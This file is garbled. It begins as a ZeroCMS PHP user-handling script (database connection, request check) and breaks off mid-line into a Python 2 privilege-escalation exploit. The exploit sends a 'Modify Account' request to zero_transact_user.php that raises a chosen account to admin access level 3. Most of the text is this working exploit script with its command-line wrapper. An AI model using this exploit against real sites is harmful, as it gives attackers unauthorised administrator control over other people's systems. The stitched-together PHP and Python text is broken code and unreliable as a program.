<?php
// (c)Perez Karjee(www.aas9.in)
// Project Site www.aas9.in/zerocms
// Created March 2014
require_once 'db.kate.php';
require_once 'zero_http_functions.kate.php';

$dbx = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD) or
    die ('Unable to connect. Check your connection parameters.');

mysql_select_db(MYSQL_DB, $dbx) or die(mysql_error($dbx));

if (isset($_REQUEST['action'])) {
ef  exploit(host,email,name,userid):
   access_level = 3 # default for admin
   url = host + '/zero_transact_user.php' #the script handles user related actions
   args = { 'user_id':userid,'email':email, 'name':name,'access_level':access_level,'action':'Modify Account' }
   data = urllib.urlencode(args)
   cj = cookielib.CookieJar()
   opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
   response = opener.open(url,data);
   print response.read()
	
def main(argv):
   host = ''
   email = ''
   accountname = ''
   userid = ''
   try:
      opts, args = getopt.getopt(argv,"hu:m:n:i:")
   except getopt.GetoptError:
      print 'zero_cms_privEscalation.py -u <host> -m <email> -n <account name> -i acount id'
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print 'zero_cms_privEscalation.py -u <host> -m <email> -n <account name> -i acount id'
         sys.exit()
      elif opt in ("-u"):
         host = arg
      elif opt in ("-m"):
      	 email = arg
      elif opt in ("-n"):
      	 accountname = arg
      elif opt in ("-i"):
      	 userid = arg
   exploit(host,email,accountname,userid)

if __name__ == "__main__":
   main(sys.argv[1:])
    
